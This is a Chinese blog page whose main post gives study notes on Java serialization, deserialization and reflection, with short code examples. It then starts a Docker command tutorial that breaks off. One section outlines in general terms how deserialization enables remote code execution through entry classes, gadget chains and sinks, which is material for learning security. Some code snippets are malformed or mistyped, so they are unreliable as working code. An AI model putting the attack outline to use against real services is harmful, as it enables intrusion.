
<p>####Java 继承与向上转型</p>
<pre><code>   当使用多态方式调用方法时，首先检查父类中是否有该方法，如果没有，则编译错误；如果有，再去调用子类的同名方法。
</code></pre>
<p>多态的好处：可以使程序有良好的扩展，并可以对所有类的对象进行通用处理。</p>
<pre><code>向上转型的对象调⽤的⽅法是⼦类覆盖或继承⽗类的⽅法，不是⽗类的⽅法
向上转型的对象⽆法调⽤⼦类特有的⽅法
</code></pre>
<p>其实向上转型就是多态的一种实现方式，在反序列化中，如果在某一个类中找不到可以实现恶意方法，就可以去他的父类找，或者父类的父类。</p>

        <h4 id="Java-接口和回调">
          <a href="#Java-接口和回调" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-接口和回调" class="headerlink" title="Java 接口和回调"></a>Java 接口和回调</h4>
      <p>​    Java的接口（interface）定义了纯抽象规范，一个类可以实现多个接口。</p>
<ul>
<li>接口也是数据类型，适用于向上转型和向下转型；</li>
<li>接口的所有方法都是抽象方法，接口不能定义实例字段；</li>
<li>接口可以定义default方法（JDK&gt;&#x3D;1.8）。</li>
<li></li>
<li><pre><code class="java">package qingchuan.java;

//定义一个People接口
interface People &#123;
    //接口的方法peopleList()
    void peopleList();
&#125;

//Students继承接口
class Student implements People &#123;
    public void peopleList() &#123;
        System.out.println(&quot;I’m a student.&quot;);
    &#125;
&#125;
//Teacher继承接口
class Teacher implements People &#123;
    public void peopleList() &#123;
        System.out.println(&quot;I’m a teacher.&quot;);
    &#125;
&#125;
public class Interface_test &#123;
    public static void main(String args[]) &#123;
        People a;          //声明接口变量
        a = new Student(); //实例化，接口变量中存放对象的引用
        a.peopleList();    //接口回调,调用Student类的peopleList()方法
        a = new Teacher(); //实例化，接口变量中存放对象的引用
        a.peopleList();    //接口回调,调用Teacher类的peopleList()方法
    &#125;
    // 结果：
    // I’m a student.
    // I’m a teacher.
&#125;
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##一、理解Java序列化和反序列化</span><br><span class="line"></span><br><span class="line">Serialization(序列化)：将java对象以一连串的字节保存在磁盘文件中的过程，也可以说是保存java对象状态的过程。序列化可以将数据永久保存在磁盘上(通常保存在文件中)。</span><br><span class="line"></span><br><span class="line">deserialization(反序列化)：将保存在磁盘文件中的java字节码重新转换成java对象称为反序列化。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###为什么需要序列化与反序列化？？</span><br><span class="line"></span><br><span class="line"> 我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</span><br><span class="line"></span><br><span class="line"> 当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</span><br><span class="line"></span><br><span class="line">① 想把内存中的对象保存到一个文件中或者数据库中时候；</span><br><span class="line">② 想用套接字在网络上传送对象的时候；</span><br><span class="line">③ 想通过RMI（远程）传输对象的时候</span><br><span class="line"></span><br><span class="line">## 序列化和反序列化的实现</span><br><span class="line"></span><br><span class="line"> 只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </span><br><span class="line"></span><br><span class="line">我们新建3个类，测试一下序列化和反序列化</span><br><span class="line"></span><br><span class="line">Person类</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">package QIngchaun;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class SerializationTest &#123;</span><br><span class="line">public  static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">    ObjectOutputStream oos =new ObjectOutputStream((new FileOutputStream(&quot;ser.bin&quot;)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line">public static void main(String[] args)throws Exception&#123;</span><br><span class="line">    Person person = new Person(&quot;aa&quot;,22);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">   serialize(person);</span><br><span class="line">&#125;</span><br><span class="line">&#125;package QIngchaun;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+</span><br><span class="line">                &quot;name:&#x27;&quot;+name+&#x27;\&#x27;&#x27;+</span><br><span class="line">                &quot;,age=&quot;+age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
</code></pre>
</li>
</ul>
<p>Serialize类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> QIngchaun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>((<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">   serialize(person);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>Unserialize类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> QIngchaun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlialize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserlialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>对上面的2个操作文件流的类的简单说明</p>
<p>ObjectOutputStream代表对象输出流：</p>
<p>它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
<p>ObjectInputStream代表对象输入流：</p>
<p>它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br>3. 一个实现 Serializable 接口的子类也是可以被序列化的。</p>
<ol start="4">
<li>静态成员变量是不能被序列化</li>
</ol>
<p>序列化是针对对象属性的，而静态成员变量是属于类的。</p>
<p>transient 标识的对象成员变量不参与序列化</p>
<p>transient实例：我们在name前加了transient，反序列化的时候结果将显示为空</p>
<p><img src="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/AAwangzhan\1\hexoblog\source\image\image-20230922112645214.png"></p>
<p><img src="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/AAwangzhan\1\hexoblog\source\image\image-20230922112902823.png"></p>
<p>在下面这个栗子中，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是写以下两个 private 方法：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException</span><br><span class="line">private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundExceptionja</span><br></pre></td></tr></table></div></figure>

<p>从这两个方法的名字就可以看出分别是序列化写入数据和反序列化读取数据用的，那么这两个方法是在哪里使用呢？其实在序列化和反序列化过程中会通过<code>反射</code>调用的，具体下面会分析这个过程哦。</p>
<blockquote>
<p>现在来看看这个 transient 应用:</p>
</blockquote>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyList</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    transient 表示该成员 arr 不需要被序列化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] arr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        给前面30个元素进行初始化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.arr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyList&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, arr=&quot;</span> + Arrays.toString(arr) +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//-------------------------- 自定义序列化反序列化 arr 元素 ------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that</span></span><br><span class="line"><span class="comment">     * is, serialize it).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serialData</span> The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;</span></span><br><span class="line"><span class="comment">     * instance is emitted (int), followed by all of its elements</span></span><br><span class="line"><span class="comment">     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//手动序列化 arr  前面30个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            s.writeObject(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,</span></span><br><span class="line"><span class="comment">     * deserialize it).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">30</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            arr[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></div></figure>

<p>测试</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransientMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./transient.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeMyList();</span><br><span class="line"> </span><br><span class="line">        deserializeMyList();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化...&quot;</span>);</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyList</span>(<span class="string">&quot;ArrayList&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(myList);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.如果 private  Object[] arr; 没有使用 transient ，那么整个数组都会被保存，而不是保存实际存储的数据</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]&#125;</span></span><br><span class="line"><span class="comment">    2.private transient Object[] arr;设置了 transient，表示 arr 元素不进行序列化</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=null&#125;</span></span><br><span class="line"><span class="comment">    3.参考 ArrayList 处理内部的 transient Object[] elementData; 数组是通过 writeObject 和 readObject 实现的</span></span><br><span class="line"><span class="comment">    我们的 MyList 内部也可以借鉴这种方式实现transient元素的手动序列化和反序列化。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化...&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> (MyList) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(myList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></div></figure>

<p>测试结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">序列化...</span><br><span class="line">writeObject...</span><br><span class="line">反序列化...</span><br><span class="line">readObject...</span><br><span class="line">MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]&#125;</span><br></pre></td></tr></table></div></figure>

<p>6.Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片</p>
<p>###为什么会产生安全问题？</p>
<p>只要服务端反序列化数据，客户端传递类的readObject中代码会被自动执行，给予攻击者在服务器上运行代码的能力</p>
<p>可能的形式</p>
<p>1.入口类的readObject直接调用危险方法</p>
<p>2.入口类参数中包含可控了，该类有危险方法，readObject时被调用</p>
<p>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</p>
<p>比如类定义类型为Object，调用equals&#x2F;hashcode&#x2F;toString</p>
<p>重点 相同类型，同名函数</p>
<p>4.构造函数&#x2F;静态代码快等类加载时隐式执行。</p>
<p>共用条件 继承serialize </p>
<p>入口类 source（重写readObject 参数类型宽泛 最好jdk自带</p>
<p>调用链 gadget chain</p>
<p>执行类 sink （rce ssrf 写文件等等</p>

        <h2 id="反射的理解">
          <a href="#反射的理解" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射的理解" class="headerlink" title="反射的理解"></a>反射的理解</h2>
      <p>Java的反射机制是值在云翔状态中，对于任意一个类都能够知道这个类所有的属性和方法；这种动态获取信息一节动态调用对象的方法的功能成为java语言的反射机制。</p>

        <h3 id="白话理解">
          <a href="#白话理解" class="heading-link"><i class="fas fa-link"></i></a><a href="#白话理解" class="headerlink" title="白话理解"></a>白话理解</h3>
      <p>正射，</p>
<p>万物有阴必有阳，有正必有反，既然有反射，就必有正射。</p>
<p>那么正射是什么呢</p>
<p>当我们写写代码的时候，到需要去用到某一个类的时候，都会先去了解这个类是做什么的，然后实例化这列，接着使用实例化好的对象进行操作，这既是正射</p>
<p>Student student &#x3D;new Student();</p>
<p>student.homework(“数学”)；</p>
<p>反射 </p>
<p>反射就是一开始你并不知道我们初始化的类的对象是什么，自然也就无法使用new这一类关键字来创建对象</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class clazz=Class.foName(&quot;reflection.Student&quot;);</span><br><span class="line"></span><br><span class="line">Method method =clazz.getMethod(&quot;doHomework&quot;,String.class);</span><br><span class="line"></span><br><span class="line">Constructor constructor =clazz.getConstructor();</span><br><span class="line"></span><br><span class="line">Object object =contructor.new.newInstance();</span><br><span class="line"></span><br><span class="line">method.invoke(object,&quot;语文&quot;);</span><br></pre></td></tr></table></div></figure>

<p>反射的作用：让java具有动态性，</p>
<p>就是在代码运行的时候，动态的进行实例化</p>
<p>可以修改已有对象的属性</p>
<p>动态生成对象</p>
<p>动态调用方法</p>
<p>操作内部类和私有方法</p>
<p>在反序列化中，定制需要的对象，</p>
<p>通过invoke调用出了同名函数以外的函数，通过Class了器创建对象，引入不能序列化的类</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">Docker File 的基本操作</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Docker-file-的基本操作">
          <a href="#Docker-file-的基本操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#Docker-file-的基本操作" class="headerlink" title="Docker file 的基本操作"></a>Docker file 的基本操作</h1>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/AAwangzhan\1\hexoblog\source\image\image-20230919184844700.png"></p>
<p>出现这种情况就说明正常，</p>

        <h2 id="对Docker操作">
          <a href="#对Docker操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#对Docker操作" class="headerlink" title="对Docker操作"></a>对Docker操作</h2>
      <p>安装完成Docker后,默认每次开机的时候都会自动启动,但我们也可以手动启动,关闭或者重启Docker</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 启动docker</span><br><span class="line">sudo service docker start</span><br><span class="line"># 重启docker</span><br><span class="line">sudo service docker restart</span><br><span class="line"># 停止docker</span><br><span class="line">sudo service docker stop</span><br></pre></td></tr></table></div></figure>


        <h2 id="对镜像的基础操作">
          <a href="#对镜像的基础操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#对镜像的基础操作" class="headerlink" title="对镜像的基础操作"></a>对镜像的基础操作</h2>
      
        <h3 id="获取当时所有镜像-docker-images">
          <a href="#获取当时所有镜像-docker-images" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当时所有镜像-docker-images" class="headerlink" title="获取当时所有镜像(docker images)"></a>获取当时所有镜像(docker images)</h3>
      <figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></div></figure>

<div class="table-container"><table>
